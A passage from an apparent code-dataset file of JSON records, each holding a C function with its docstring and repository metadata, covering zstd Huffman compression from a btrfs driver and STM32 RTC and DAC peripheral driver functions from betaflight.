DEBUGLOG(5, \"set_basic - no gain\");\n            hufMetadata->hType = set_basic;\n            return 0;\n        }\n    }\n\n    /* Validate the previous Huffman table */\n    if (repeat == HUF_repeat_check && !HUF_validateCTable((HUF_CElt const*)prevHuf->CTable, countWksp, maxSymbolValue)) {\n        repeat = HUF_repeat_none;\n    }\n\n    /* Build Huffman Tree */\n    memset(nextHuf->CTable, 0, sizeof(nextHuf->CTable));\n    huffLog = HUF_optimalTableLog(huffLog, srcSize, maxSymbolValue);\n    {   size_t const maxBits = HUF_buildCTable_wksp((HUF_CElt*)nextHuf->CTable, countWksp,\n                                                    maxSymbolValue, huffLog,\n                                                    nodeWksp, nodeWkspSize);\n        FORWARD_IF_ERROR(maxBits, \"HUF_buildCTable_wksp\");\n        huffLog = (U32)maxBits;\n        {   /* Build and write the CTable */\n            size_t const newCSize = HUF_estimateCompressedSize(\n                    (HUF_CElt*)nextHuf->CTable, countWksp, maxSymbolValue);\n            size_t const hSize = HUF_writeCTable(\n                    hufMetadata->hufDesBuffer, sizeof(hufMetadata->hufDesBuffer),\n                    (HUF_CElt*)nextHuf->CTable, maxSymbolValue, huffLog);\n            /* Check against repeating the previous CTable */\n            if (repeat != HUF_repeat_none) {\n                size_t const oldCSize = HUF_estimateCompressedSize(\n                        (HUF_CElt const*)prevHuf->CTable, countWksp, maxSymbolValue);\n                if (oldCSize < srcSize && (oldCSize <= hSize + newCSize || hSize + 12 >= srcSize)) {\n                    DEBUGLOG(5, \"set_repeat - smaller\");\n                    memcpy(nextHuf, prevHuf, sizeof(*prevHuf));\n                    hufMetadata->hType = set_repeat;\n                    return 0;\n                }\n            }\n            if (newCSize + hSize >= srcSize) {\n                DEBUGLOG(5, \"set_basic - no gains\");\n                memcpy(nextHuf, prevHuf, sizeof(*prevHuf));\n                hufMetadata->hType = set_basic;\n                return 0;\n            }\n            DEBUGLOG(5, \"set_compressed (hSize=%u)\", (U32)hSize);\n            hufMetadata->hType = set_compressed;\n            nextHuf->repeatMode = HUF_repeat_check;\n            return hSize;\n        }\n    }\n}", "path": "btrfs/src/zstd/zstd_compress_superblock.c", "commit_date": "2020-08-08 00:00:00", "repo_name": "maharmstone/btrfs", "stars": 4838, "license": "lgpl-3.0", "language": "c", "size": 61836}
{"docstring": "/* ZSTD_getLongOffsetsShare() :\n * condition : offTable must be valid\n * @return : \"share\" of long offsets (arbitrarily defined as > (1<<23))\n *           compared to maximum possible of (1<<OffFSELog) */\n", "func_signal": "static unsigned\nZSTD_getLongOffsetsShare(const ZSTD_seqSymbol* offTable)", "code": "{\n    const void* ptr = offTable;\n    U32 const tableLog = ((const ZSTD_seqSymbol_header*)ptr)[0].tableLog;\n    const ZSTD_seqSymbol* table = offTable + 1;\n    U32 const max = 1 << tableLog;\n    U32 u, total = 0;\n    DEBUGLOG(5, \"ZSTD_getLongOffsetsShare: (tableLog=%u)\", tableLog);\n\n    assert(max <= (1 << OffFSELog));  /* max not too large */\n    for (u=0; u<max; u++) {\n        if (table[u].nbAdditionalBits > 22) total += 1;\n    }\n\n    assert(tableLog <= OffFSELog);\n    total <<= (OffFSELog - tableLog);  /* scale to OffFSELog */\n\n    return total;\n}", "path": "btrfs/src/zstd/zstd_decompress_block.c", "commit_date": "2020-08-08 00:00:00", "repo_name": "maharmstone/btrfs", "stars": 4838, "license": "lgpl-3.0", "language": "c", "size": 61836}
{"docstring": "/**\n  * @brief  Get the RTC Alarm value and masks.\n  * @param  hrtc RTC handle\n  * @param  sAlarm Pointer to Date structure\n  * @param  Alarm Specifies the Alarm.\n  *          This parameter can be one of the following values:\n  *             @arg RTC_ALARM_A: AlarmA\n  *             @arg RTC_ALARM_B: AlarmB\n  * @param  Format Specifies the format of the entered parameters.\n  *          This parameter can be one of the following values:\n  *             @arg RTC_FORMAT_BIN: Binary data format\n  *             @arg RTC_FORMAT_BCD: BCD data format\n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_RTC_GetAlarm(RTC_HandleTypeDef *hrtc, RTC_AlarmTypeDef *sAlarm, uint32_t Alarm, uint32_t Format)", "code": "{\n  uint32_t tmpreg;\n  uint32_t subsecondtmpreg;\n\n  /* Check the parameters */\n  assert_param(IS_RTC_FORMAT(Format));\n  assert_param(IS_RTC_ALARM(Alarm));\n\n  if(Alarm == RTC_ALARM_A)\n  {\n    /* AlarmA */\n    sAlarm->Alarm = RTC_ALARM_A;\n\n    tmpreg = (uint32_t)(hrtc->Instance->ALRMAR);\n    subsecondtmpreg = (uint32_t)((hrtc->Instance->ALRMASSR) & RTC_ALRMASSR_SS);\n\n    /* Fill the structure with the read parameters */\n    sAlarm->AlarmTime.Hours      = (uint8_t)((tmpreg & (RTC_ALRMAR_HT  | RTC_ALRMAR_HU))  >> RTC_ALRMAR_HU_Pos);\n    sAlarm->AlarmTime.Minutes    = (uint8_t)((tmpreg & (RTC_ALRMAR_MNT | RTC_ALRMAR_MNU)) >> RTC_ALRMAR_MNU_Pos);\n    sAlarm->AlarmTime.Seconds    = (uint8_t)((tmpreg & (RTC_ALRMAR_ST  | RTC_ALRMAR_SU))  >> RTC_ALRMAR_SU_Pos);\n    sAlarm->AlarmTime.TimeFormat = (uint8_t)((tmpreg &  RTC_ALRMAR_PM)                    >> RTC_ALRMAR_PM_Pos);\n    sAlarm->AlarmTime.SubSeconds = (uint32_t) subsecondtmpreg;\n    sAlarm->AlarmDateWeekDay     = (uint8_t)((tmpreg & (RTC_ALRMAR_DT  | RTC_ALRMAR_DU))  >> RTC_ALRMAR_DU_Pos);\n    sAlarm->AlarmDateWeekDaySel  = (uint32_t)(tmpreg &  RTC_ALRMAR_WDSEL);\n    sAlarm->AlarmMask            = (uint32_t)(tmpreg &  RTC_ALARMMASK_ALL);\n  }\n  else\n  {\n    sAlarm->Alarm = RTC_ALARM_B;\n\n    tmpreg = (uint32_t)(hrtc->Instance->ALRMBR);\n    subsecondtmpreg = (uint32_t)((hrtc->Instance->ALRMBSSR) & RTC_ALRMBSSR_SS);\n\n    /* Fill the structure with the read parameters */\n    sAlarm->AlarmTime.Hours      = (uint8_t)((tmpreg & (RTC_ALRMBR_HT  | RTC_ALRMBR_HU))  >> RTC_ALRMBR_HU_Pos);\n    sAlarm->AlarmTime.Minutes    = (uint8_t)((tmpreg & (RTC_ALRMBR_MNT | RTC_ALRMBR_MNU)) >> RTC_ALRMBR_MNU_Pos);\n    sAlarm->AlarmTime.Seconds    = (uint8_t)((tmpreg & (RTC_ALRMBR_ST  | RTC_ALRMBR_SU))  >> RTC_ALRMBR_SU_Pos);\n    sAlarm->AlarmTime.TimeFormat = (uint8_t)((tmpreg &  RTC_ALRMBR_PM)                    >> RTC_ALRMBR_PM_Pos);\n    sAlarm->AlarmTime.SubSeconds = (uint32_t) subsecondtmpreg;\n    sAlarm->AlarmDateWeekDay     = (uint8_t)((tmpreg & (RTC_ALRMBR_DT | RTC_ALRMBR_DU))   >> RTC_ALRMBR_DU_Pos);\n    sAlarm->AlarmDateWeekDaySel  = (uint32_t)(tmpreg &  RTC_ALRMBR_WDSEL);\n    sAlarm->AlarmMask            = (uint32_t)(tmpreg &  RTC_ALARMMASK_ALL);\n  }\n\n  if(Format == RTC_FORMAT_BIN)\n  {\n    sAlarm->AlarmTime.Hours = RTC_Bcd2ToByte(sAlarm->AlarmTime.Hours);\n    sAlarm->AlarmTime.Minutes = RTC_Bcd2ToByte(sAlarm->AlarmTime.Minutes);\n    sAlarm->AlarmTime.Seconds = RTC_Bcd2ToByte(sAlarm->AlarmTime.Seconds);\n    sAlarm->AlarmDateWeekDay = RTC_Bcd2ToByte(sAlarm->AlarmDateWeekDay);\n  }\n\n  return HAL_OK;\n}", "path": "betaflight/lib/main/STM32H7/Drivers/STM32H7xx_HAL_Driver/Src/stm32h7xx_hal_rtc.c", "commit_date": "2020-09-14 00:00:00", "repo_name": "betaflight/betaflight", "stars": 7745, "license": "gpl-3.0", "language": "c", "size": 393740}
{"docstring": "/**\n  * @brief  Deactivate the specified RTC Alarm.\n  * @param  hrtc RTC handle\n  * @param  Alarm Specifies the Alarm.\n  *          This parameter can be one of the following values:\n  *            @arg RTC_ALARM_A:  AlarmA\n  *            @arg RTC_ALARM_B:  AlarmB\n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_RTC_DeactivateAlarm(RTC_HandleTypeDef *hrtc, uint32_t Alarm)", "code": "{\n  uint32_t tickstart;\n\n  /* Check the parameters */\n  assert_param(IS_RTC_ALARM(Alarm));\n\n  /* Process Locked */\n  __HAL_LOCK(hrtc);\n\n  hrtc->State = HAL_RTC_STATE_BUSY;\n\n  /* Disable the write protection for RTC registers */\n  __HAL_RTC_WRITEPROTECTION_DISABLE(hrtc);\n\n  if(Alarm == RTC_ALARM_A)\n  {\n    /* AlarmA */\n    __HAL_RTC_ALARMA_DISABLE(hrtc);\n\n    /* In case of interrupt mode is used, the interrupt source must disabled */\n    __HAL_RTC_ALARM_DISABLE_IT(hrtc, RTC_IT_ALRA);\n\n    tickstart = HAL_GetTick();\n\n    /* Wait till RTC ALRxWF flag is set and if Time out is reached exit */\n#if defined(RTC_ICSR_ALRAWF)\n    while (READ_BIT(hrtc->Instance->ICSR, RTC_FLAG_ALRAWF) == 0U)\n#endif /* RTC_ICSR_ALRAWF */\n#if defined(RTC_ISR_ALRAWF)\n    while(__HAL_RTC_ALARM_GET_FLAG(hrtc, RTC_FLAG_ALRAWF) == 0U)\n#endif /* RTC_ISR_ALRAWF */\n    {\n      if((HAL_GetTick()  - tickstart) > RTC_TIMEOUT_VALUE)\n      {\n        /* Enable the write protection for RTC registers */\n        __HAL_RTC_WRITEPROTECTION_ENABLE(hrtc);\n\n        hrtc->State = HAL_RTC_STATE_TIMEOUT;\n\n        /* Process Unlocked */\n        __HAL_UNLOCK(hrtc);\n\n        return HAL_TIMEOUT;\n      }\n    }\n  }\n  else\n  {\n    /* AlarmB */\n    __HAL_RTC_ALARMB_DISABLE(hrtc);\n\n    /* In case of interrupt mode is used, the interrupt source must disabled */\n    __HAL_RTC_ALARM_DISABLE_IT(hrtc, RTC_IT_ALRB);\n\n    tickstart = HAL_GetTick();\n\n    /* Wait till RTC ALRxWF flag is set and if Time out is reached exit */\n#if defined(RTC_ICSR_ALRBWF)\n    while (READ_BIT(hrtc->Instance->ICSR, RTC_FLAG_ALRBWF) == 0U)\n#endif /* RTC_ICSR_ALRBWF */\n#if defined(RTC_ISR_ALRBWF)\n    while(__HAL_RTC_ALARM_GET_FLAG(hrtc, RTC_FLAG_ALRBWF) == 0U)\n#endif /* RTC_ISR_ALRBWF */\n    {\n      if((HAL_GetTick() - tickstart) > RTC_TIMEOUT_VALUE)\n      {\n        /* Enable the write protection for RTC registers */\n        __HAL_RTC_WRITEPROTECTION_ENABLE(hrtc);\n\n        hrtc->State = HAL_RTC_STATE_TIMEOUT;\n\n        /* Process Unlocked */\n        __HAL_UNLOCK(hrtc);\n\n        return HAL_TIMEOUT;\n      }\n    }\n  }\n  /* Enable the write protection for RTC registers */\n  __HAL_RTC_WRITEPROTECTION_ENABLE(hrtc);\n\n  hrtc->State = HAL_RTC_STATE_READY;\n\n  /* Process Unlocked */\n  __HAL_UNLOCK(hrtc);\n\n  return HAL_OK;\n}", "path": "betaflight/lib/main/STM32H7/Drivers/STM32H7xx_HAL_Driver/Src/stm32h7xx_hal_rtc.c", "commit_date": "2020-09-14 00:00:00", "repo_name": "betaflight/betaflight", "stars": 7745, "license": "gpl-3.0", "language": "c", "size": 393740}
{"docstring": "/**\n  * @brief  Returns the last data output value of the selected DAC channel.\n  * @param  DAC_Channel: The selected DAC channel. \n  *          This parameter can be one of the following values:\n  *            @arg DAC_Channel_1: DAC Channel1 selected\n  *            @arg DAC_Channel_2: DAC Channel2 selected\n  * @retval The selected DAC channel data output value.\n  */\n", "func_signal": "uint16_t DAC_GetDataOutputValue(uint32_t DAC_Channel)", "code": "{\n  __IO uint32_t tmp = 0;\n  \n  /* Check the parameters */\n  assert_param(IS_DAC_CHANNEL(DAC_Channel));\n  \n  tmp = (uint32_t) DAC_BASE ;\n  tmp += DOR_OFFSET + ((uint32_t)DAC_Channel >> 2);\n  \n  /* Returns the DAC channel data output register value */\n  return (uint16_t) (*(__IO uint32_t*) tmp);\n}", "path": "betaflight/lib/main/STM32F4/Drivers/STM32F4xx_StdPeriph_Driver/src/stm32f4xx_dac.c", "commit_date": "2017-07-29 00:00:00", "repo_name": "betaflight/betaflight", "stars": 7745, "license": "gpl-3.0", "language": "c", "size": 393740}
{"docstring": "/**\n  * @brief  Initializes the DAC peripheral according to the specified parameters\n  *         in the DAC_InitStruct.\n  * @param  DAC_Channel: the selected DAC channel. \n  *          This parameter can be one of the following values:\n  *            @arg DAC_Channel_1: DAC Channel1 selected\n  *            @arg DAC_Channel_2: DAC Channel2 selected\n  * @param  DAC_InitStruct: pointer to a DAC_InitTypeDef structure that contains\n  *         the configuration information for the  specified DAC channel.\n  * @retval None\n  */\n", "func_signal": "void DAC_Init(uint32_t DAC_Channel, DAC_InitTypeDef* DAC_InitStruct)", "code": "{\n  uint32_t tmpreg1 = 0, tmpreg2 = 0;\n\n  /* Check the DAC parameters */\n  assert_param(IS_DAC_TRIGGER(DAC_InitStruct->DAC_Trigger));\n  assert_param(IS_DAC_GENERATE_WAVE(DAC_InitStruct->DAC_WaveGeneration));\n  assert_param(IS_DAC_LFSR_UNMASK_TRIANGLE_AMPLITUDE(DAC_InitStruct->DAC_LFSRUnmask_TriangleAmplitude));\n  assert_param(IS_DAC_OUTPUT_BUFFER_STATE(DAC_InitStruct->DAC_OutputBuffer));\n\n/*---------------------------- DAC CR Configuration --------------------------*/\n  /* Get the DAC CR value */\n  tmpreg1 = DAC->CR;\n  /* Clear BOFFx, TENx, TSELx, WAVEx and MAMPx bits */\n  tmpreg1 &= ~(CR_CLEAR_MASK << DAC_Channel);\n  /* Configure for the selected DAC channel: buffer output, trigger, \n     wave generation, mask/amplitude for wave generation */\n  /* Set TSELx and TENx bits according to DAC_Trigger value */\n  /* Set WAVEx bits according to DAC_WaveGeneration value */\n  /* Set MAMPx bits according to DAC_LFSRUnmask_TriangleAmplitude value */ \n  /* Set BOFFx bit according to DAC_OutputBuffer value */   \n  tmpreg2 = (DAC_InitStruct->DAC_Trigger | DAC_InitStruct->DAC_WaveGeneration |\n             DAC_InitStruct->DAC_LFSRUnmask_TriangleAmplitude | \\\n             DAC_InitStruct->DAC_OutputBuffer);\n  /* Calculate CR register value depending on DAC_Channel */\n  tmpreg1 |= tmpreg2 << DAC_Channel;\n  /* Write to DAC CR */\n  DAC->CR = tmpreg1;\n}", "path": "betaflight/lib/main/STM32F4/Drivers/STM32F4xx_StdPeriph_Driver/src/stm32f4xx_dac.c", "commit_date": "2017-07-29 00:00:00", "repo_name": "betaflight/betaflight", "stars": 7745, "license": "gpl-3.0", "language": "c", "size": 393740}
{"docstring": "/**\n  * @brief  Convert from 2 digit BCD to Binary.\n  * @param  Value BCD value to be converted\n  * @retval Converted word\n  */\n", "func_signal": "uint8_t RTC_Bcd2ToByte(uint8_t Value)", "code": "{\n  uint8_t tmp;\n  tmp = ((Value & 0xF0U) >> 4U) * 10U;\n  return (tmp + (Value & 0x0FU));\n}", "path": "betaflight/lib/main/STM32H7/Drivers/STM32H7xx_HAL_Driver/Src/stm32h7xx_hal_rtc.c", "commit_date": "2020-09-14 00:00:00", "repo_name": "betaflight/betaflight", "stars": 7745, "license": "gpl-3.0", "language": "c", "size": 393740}
{"docstring": "/**\n  * @brief  Clears the DAC channel's interrupt pending bits.\n  * @param  DAC_Channel: The selected DAC channel. \n  *          This parameter can be one of the following values:\n  *            @arg DAC_Channel_1: DAC Channel1 selected\n  *            @arg DAC_Channel_2: DAC Channel2 selected\n  * @param  DAC_IT: specifies the DAC interrupt pending bit to clear.\n  *          This parameter can be the following values:\n  *            @arg DAC_IT_DMAUDR: DMA underrun interrupt mask                         \n  * @note   The DMA underrun occurs when a second external trigger arrives before the \n  *         acknowledgement for the first external trigger is received (first request).                           \n  * @retval None\n  */\n", "func_signal": "void DAC_ClearITPendingBit(uint32_t DAC_Channel, uint32_t DAC_IT)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_DAC_CHANNEL(DAC_Channel));\n  assert_param(IS_DAC_IT(DAC_IT)); \n\n  /* Clear the selected DAC interrupt pending bits */\n  DAC->SR = (DAC_IT << DAC_Channel);\n}", "path": "betaflight/lib/main/STM32F4/Drivers/STM32F4xx_StdPeriph_Driver/src/stm32f4xx_dac.c", "commit_date": "2017-07-29 00:00:00", "repo_name": "betaflight/betaflight", "stars": 7745, "license": "gpl-3.0", "language": "c", "size": 393740}
{"docstring": "/**\n  * @brief  Clears the DAC channel's pending flags.\n  * @param  DAC_Channel: The selected DAC channel. \n  *          This parameter can be one of the following values:\n  *            @arg DAC_Channel_1: DAC Channel1 selected\n  *            @arg DAC_Channel_2: DAC Channel2 selected\n  * @param  DAC_FLAG: specifies the flag to clear. \n  *          This parameter can be of the following value:\n  *            @arg DAC_FLAG_DMAUDR: DMA underrun flag \n  * @note   The DMA underrun occurs when a second external trigger arrives before the \n  *         acknowledgement for the first external trigger is received (first request).                           \n  * @retval None\n  */\n", "func_signal": "void DAC_ClearFlag(uint32_t DAC_Channel, uint32_t DAC_FLAG)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_DAC_CHANNEL(DAC_Channel));\n  assert_param(IS_DAC_FLAG(DAC_FLAG));\n\n  /* Clear the selected DAC flags */\n  DAC->SR = (DAC_FLAG << DAC_Channel);\n}", "path": "betaflight/lib/main/STM32F4/Drivers/STM32F4xx_StdPeriph_Driver/src/stm32f4xx_dac.c", "commit_date": "2017-07-29 00:00:00", "repo_name": "betaflight/betaflight", "stars": 7745, "license": "gpl-3.0", "language": "c", "size": 393740}
{"docstring": "/**\n  * @brief  Checks whether the specified DAC flag is set or not.\n  * @param  DAC_Channel: The selected DAC channel. \n  *          This parameter can be one of the following values:\n  *            @arg DAC_Channel_1: DAC Channel1 selected\n  *            @arg DAC_Channel_2: DAC Channel2 selected\n  * @param  DAC_FLAG: specifies the flag to check. \n  *          This parameter can be only of the following value:\n  *            @arg DAC_FLAG_DMAUDR: DMA underrun flag\n  * @note   The DMA underrun occurs when a second external trigger arrives before the \n  *         acknowledgement for the first external trigger is received (first request).\n  * @retval The new state of DAC_FLAG (SET or RESET).\n  */\n", "func_signal": "FlagStatus DAC_GetFlagStatus(uint32_t DAC_Channel, uint32_t DAC_FLAG)", "code": "{\n  FlagStatus bitstatus = RESET;\n  /* Check the parameters */\n  assert_param(IS_DAC_CHANNEL(DAC_Channel));\n  assert_param(IS_DAC_FLAG(DAC_FLAG));\n\n  /* Check the status of the specified DAC flag */\n  if ((DAC->SR & (DAC_FLAG << DAC_Channel)) != (uint8_t)RESET)\n  {\n    /* DAC_FLAG is set */\n    bitstatus = SET;\n  }\n  else\n  {\n    /* DAC_FLAG is reset */\n    bitstatus = RESET;\n  }\n  /* Return the DAC_FLAG status */\n  return  bitstatus;\n}", "path": "betaflight/lib/main/STM32F4/Drivers/STM32F4xx_StdPeriph_Driver/src/stm32f4xx_dac.c", "commit_date": "2017-07-29 00:00:00", "repo_name": "betaflight/betaflight", "stars": 7745, "license": "gpl-3.0", "language": "c", "size": 393740}
{"docstring": "/**\n  * @brief  Exit the RTC Initialization mode.\n  * @param  hrtc RTC handle\n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef RTC_ExitInitMode(RTC_HandleTypeDef *hrtc)", "code": "{\n  HAL_StatusTypeDef status = HAL_OK;\n\n  /* Check if the Initialization mode is set */\n#if defined(RTC_ICSR_INITF)\n\n  /* Exit Initialization mode */\n  CLEAR_BIT(RTC->ICSR, RTC_ICSR_INIT);\n\n#elif defined(RTC_ISR_INITF)\n\n  /* Exit Initialization mode */\n  CLEAR_BIT(RTC->ISR, RTC_ISR_INITF);\n\n#endif /* RTC_ISR_INITF */\n  /* If CR_BYPSHAD bit = 0, wait for synchro */\n  if (READ_BIT(RTC->CR, RTC_CR_BYPSHAD) == 0U)\n  {\n    if (HAL_RTC_WaitForSynchro(hrtc) != HAL_OK)\n    {\n      hrtc->State = HAL_RTC_STATE_TIMEOUT;\n      status = HAL_TIMEOUT;\n    }\n  }\n  else\n  {\n    /* Clear BYPSHAD bit */\n    CLEAR_BIT(RTC->CR, RTC_CR_BYPSHAD);\n    if (HAL_RTC_WaitForSynchro(hrtc) != HAL_OK)\n    {\n      hrtc->State = HAL_RTC_STATE_TIMEOUT;\n      status = HAL_TIMEOUT;\n    }\n    /* Restore BYPSHAD bit */\n    SET_BIT(RTC->CR, RTC_CR_BYPSHAD);\n  }\n\n  return status;\n}", "path": "betaflight/lib/main/STM32H7/Drivers/STM32H7xx_HAL_Driver/Src/stm32h7xx_hal_rtc.c", "commit_date": "2020-09-14 00:00:00", "repo_name": "betaflight/betaflight", "stars": 7745, "license": "gpl-3.0", "language": "c", "size": 393740}
{"docstring": "/**\n  * @brief  Enables or disables the selected DAC channel wave generation.\n  * @param  DAC_Channel: The selected DAC channel. \n  *          This parameter can be one of the following values:\n  *            @arg DAC_Channel_1: DAC Channel1 selected\n  *            @arg DAC_Channel_2: DAC Channel2 selected\n  * @param  DAC_Wave: specifies the wave type to enable or disable.\n  *          This parameter can be one of the following values:\n  *            @arg DAC_Wave_Noise: noise wave generation\n  *            @arg DAC_Wave_Triangle: triangle wave generation\n  * @param  NewState: new state of the selected DAC channel wave generation.\n  *          This parameter can be: ENABLE or DISABLE.  \n  * @retval None\n  */\n", "func_signal": "void DAC_WaveGenerationCmd(uint32_t DAC_Channel, uint32_t DAC_Wave, FunctionalState NewState)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_DAC_CHANNEL(DAC_Channel));\n  assert_param(IS_DAC_WAVE(DAC_Wave)); \n  assert_param(IS_FUNCTIONAL_STATE(NewState));\n\n  if (NewState != DISABLE)\n  {\n    /* Enable the selected wave generation for the selected DAC channel */\n    DAC->CR |= DAC_Wave << DAC_Channel;\n  }\n  else\n  {\n    /* Disable the selected wave generation for the selected DAC channel */\n    DAC->CR &= ~(DAC_Wave << DAC_Channel);\n  }\n}", "path": "betaflight/lib/main/STM32F4/Drivers/STM32F4xx_StdPeriph_Driver/src/stm32f4xx_dac.c", "commit_date": "2017-07-29 00:00:00", "repo_name": "betaflight/betaflight", "stars": 7745, "license": "gpl-3.0", "language": "c", "size": 393740}
{"docstring": "/**\n  * @brief  Fills each DAC_InitStruct member with its default value.\n  * @param  DAC_InitStruct: pointer to a DAC_InitTypeDef structure which will \n  *         be initialized.\n  * @retval None\n  */\n", "func_signal": "void DAC_StructInit(DAC_InitTypeDef* DAC_InitStruct)", "code": "{\n/*--------------- Reset DAC init structure parameters values -----------------*/\n  /* Initialize the DAC_Trigger member */\n  DAC_InitStruct->DAC_Trigger = DAC_Trigger_None;\n  /* Initialize the DAC_WaveGeneration member */\n  DAC_InitStruct->DAC_WaveGeneration = DAC_WaveGeneration_None;\n  /* Initialize the DAC_LFSRUnmask_TriangleAmplitude member */\n  DAC_InitStruct->DAC_LFSRUnmask_TriangleAmplitude = DAC_LFSRUnmask_Bit0;\n  /* Initialize the DAC_OutputBuffer member */\n  DAC_InitStruct->DAC_OutputBuffer = DAC_OutputBuffer_Enable;\n}", "path": "betaflight/lib/main/STM32F4/Drivers/STM32F4xx_StdPeriph_Driver/src/stm32f4xx_dac.c", "commit_date": "2017-07-29 00:00:00", "repo_name": "betaflight/betaflight", "stars": 7745, "license": "gpl-3.0", "language": "c", "size": 393740}
{"docstring": "/**\n  * @brief  Convert a 2 digit decimal to BCD format.\n  * @param  Value Byte to be converted\n  * @retval Converted byte\n  */\n", "func_signal": "uint8_t RTC_ByteToBcd2(uint8_t Value)", "code": "{\n  uint32_t bcdhigh = 0U;\n  uint8_t  bcdlow  = Value;\n\n  while (bcdlow >= 10U)\n  {\n    bcdhigh++;\n    bcdlow -= 10U;\n  }\n\n  return ((uint8_t)(bcdhigh << 4U) | bcdlow);\n}", "path": "betaflight/lib/main/STM32H7/Drivers/STM32H7xx_HAL_Driver/Src/stm32h7xx_hal_rtc.c", "commit_date": "2020-09-14 00:00:00", "repo_name": "betaflight/betaflight", "stars": 7745, "license": "gpl-3.0", "language": "c", "size": 393740}
{"docstring": "/**\n  * @brief  Enables or disables simultaneously the two DAC channels software triggers.\n  * @param  NewState: new state of the DAC channels software triggers.\n  *          This parameter can be: ENABLE or DISABLE.\n  * @retval None\n  */\n", "func_signal": "void DAC_DualSoftwareTriggerCmd(FunctionalState NewState)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_FUNCTIONAL_STATE(NewState));\n\n  if (NewState != DISABLE)\n  {\n    /* Enable software trigger for both DAC channels */\n    DAC->SWTRIGR |= DUAL_SWTRIG_SET;\n  }\n  else\n  {\n    /* Disable software trigger for both DAC channels */\n    DAC->SWTRIGR &= DUAL_SWTRIG_RESET;\n  }\n}", "path": "betaflight/lib/main/STM32F4/Drivers/STM32F4xx_StdPeriph_Driver/src/stm32f4xx_dac.c", "commit_date": "2017-07-29 00:00:00", "repo_name": "betaflight/betaflight", "stars": 7745, "license": "gpl-3.0", "language": "c", "size": 393740}
{"docstring": "/**\n  * @brief  Enables or disables the selected DAC channel software trigger.\n  * @param  DAC_Channel: The selected DAC channel. \n  *          This parameter can be one of the following values:\n  *            @arg DAC_Channel_1: DAC Channel1 selected\n  *            @arg DAC_Channel_2: DAC Channel2 selected\n  * @param  NewState: new state of the selected DAC channel software trigger.\n  *          This parameter can be: ENABLE or DISABLE.\n  * @retval None\n  */\n", "func_signal": "void DAC_SoftwareTriggerCmd(uint32_t DAC_Channel, FunctionalState NewState)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_DAC_CHANNEL(DAC_Channel));\n  assert_param(IS_FUNCTIONAL_STATE(NewState));\n\n  if (NewState != DISABLE)\n  {\n    /* Enable software trigger for the selected DAC channel */\n    DAC->SWTRIGR |= (uint32_t)DAC_SWTRIGR_SWTRIG1 << (DAC_Channel >> 4);\n  }\n  else\n  {\n    /* Disable software trigger for the selected DAC channel */\n    DAC->SWTRIGR &= ~((uint32_t)DAC_SWTRIGR_SWTRIG1 << (DAC_Channel >> 4));\n  }\n}", "path": "betaflight/lib/main/STM32F4/Drivers/STM32F4xx_StdPeriph_Driver/src/stm32f4xx_dac.c", "commit_date": "2017-07-29 00:00:00", "repo_name": "betaflight/betaflight", "stars": 7745, "license": "gpl-3.0", "language": "c", "size": 393740}
{"docstring": "/**\n  * @brief  Handle AlarmA Polling request.\n  * @param  hrtc RTC handle\n  * @param  Timeout Timeout duration\n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_RTC_PollForAlarmAEvent(RTC_HandleTypeDef *hrtc, uint32_t Timeout)", "code": "{\n\n  uint32_t tickstart = HAL_GetTick();\n\n  while (__HAL_RTC_ALARM_GET_FLAG(hrtc, RTC_FLAG_ALRAF) == 0U)\n  {\n    if(Timeout != HAL_MAX_DELAY)\n    {\n      if(((HAL_GetTick() - tickstart) > Timeout) || (Timeout == 0U))\n      {\n        hrtc->State = HAL_RTC_STATE_TIMEOUT;\n        return HAL_TIMEOUT;\n      }\n    }\n  }\n\n  /* Clear the Alarm interrupt pending bit */\n  __HAL_RTC_ALARM_CLEAR_FLAG(hrtc, RTC_FLAG_ALRAF);\n\n  /* Change RTC state */\n  hrtc->State = HAL_RTC_STATE_READY;\n\n  return HAL_OK;\n}", "path": "betaflight/lib/main/STM32H7/Drivers/STM32H7xx_HAL_Driver/Src/stm32h7xx_hal_rtc.c", "commit_date": "2020-09-14 00:00:00", "repo_name": "betaflight/betaflight", "stars": 7745, "license": "gpl-3.0", "language": "c", "size": 393740}
{"docstring": "/**\n  * @brief  Set the specified data holding register value for DAC channel2.\n  * @param  DAC_Align: Specifies the data alignment for DAC channel2.\n  *          This parameter can be one of the following values:\n  *            @arg DAC_Align_8b_R: 8bit right data alignment selected\n  *            @arg DAC_Align_12b_L: 12bit left data alignment selected\n  *            @arg DAC_Align_12b_R: 12bit right data alignment selected\n  * @param  Data: Data to be loaded in the selected data holding register.\n  * @retval None\n  */\n", "func_signal": "void DAC_SetChannel2Data(uint32_t DAC_Align, uint16_t Data)", "code": "{\n  __IO uint32_t tmp = 0;\n\n  /* Check the parameters */\n  assert_param(IS_DAC_ALIGN(DAC_Align));\n  assert_param(IS_DAC_DATA(Data));\n  \n  tmp = (uint32_t)DAC_BASE;\n  tmp += DHR12R2_OFFSET + DAC_Align;\n\n  /* Set the DAC channel2 selected data holding register */\n  *(__IO uint32_t *)tmp = Data;\n}", "path": "betaflight/lib/main/STM32F4/Drivers/STM32F4xx_StdPeriph_Driver/src/stm32f4xx_dac.c", "commit_date": "2017-07-29 00:00:00", "repo_name": "betaflight/betaflight", "stars": 7745, "license": "gpl-3.0", "language": "c", "size": 393740}
